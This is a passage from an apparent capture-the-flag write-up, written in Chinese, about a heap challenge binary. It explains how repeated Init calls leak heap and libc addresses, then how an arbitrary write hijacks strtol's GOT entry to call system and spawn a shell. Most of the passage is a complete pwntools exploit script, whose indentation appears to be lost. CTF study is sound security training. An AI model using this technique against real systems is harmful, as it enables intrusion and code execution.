
`write`函数输出的是`newest_Init->v_ptr`，但是当连续两次调用`Init`后，会`free`掉之前`create`创建的`Init`对象。由于此时没有调用`add`，所以记录的还是`free`之前的，然后调用`show`即可泄露地址（此时`now_Create_obj->newest_Init`存的是`smallbin`的`fd`），可以一次泄露`heap`和`libc`。

### getshell

通过多次的重复`Init()`配合`add()`可以实现任意地址写。最后劫持`strtolog`的`got`为`system`，发送`sh`即可。（实际测试可能要多试几次）

```python
# encoding=utf-8

from pwn import *
from LibcSearcher import *

s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
libc_path = "/lib/x86_64-linux-gnu/libc-2.23.so"
elf_path = "./pwn"
libc = ELF(libc_path)
elf = ELF(elf_path)
#io = remote("node3.buuoj.cn",26000)
if sys.argv[1]=='1':
context(log_level = 'debug',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
elif sys.argv[1]=='0':
context(log_level = 'info',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
#io = process([elf_path],env={"LD_PRELOAD":libc_path})
cho='choice:' # choice提示语
siz='please input size:' # size输入提示语
con='content:' # content输入提示语
ind='' # index输入提示语
edi='' # edit输入提示语

def init(c='1'):
sal(cho,c)
def create(c='2'):
sal(cho,c)
def add(size,c='3'):
sal(cho,c)
sal(siz,str(size))
def set(content='',c='4'):
sal(cho,c)
sa(con,content)
def show(c='5'):
sal(cho,c)
def size(c='6'):
sal(cho,c)
def d():
pause()

def exp():
global io
io = process(elf_path)
# 0x20 Father
init() # 0x90 Class1
create() # 0x20 new_obj
add(0x38) # 0x40
add(0x48)
class1_vtable_addr = 0x401990
init()
#d()
add(0x88) # 放入smallbin
show()
libc.address = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-88-0x10-libc.sym['__malloc_hook']
fh = libc.sym['__free_hook']
mh = libc.sym['__malloc_hook']
success("libc:"+hex(libc.address))
r(2)
heap = u64(r(6).ljust(8,'\x00'))-(0x236fc40-0x235e000)
success("heap:"+hex(heap))
#create()
pop_rdi = 0x0000000000401833
bin_sh = libc.address+0x000000000018ce17
leave_ret = 0x0000000000042361+libc.address
#set(p64(0)+libc.sym['__free_hook'])
create()
init()
add(0x88)
set(p64(0)+p64(elf.got['strtol']))
set(p64(libc.sym['system']))
s("sh\x00")
shell()

exp()
```
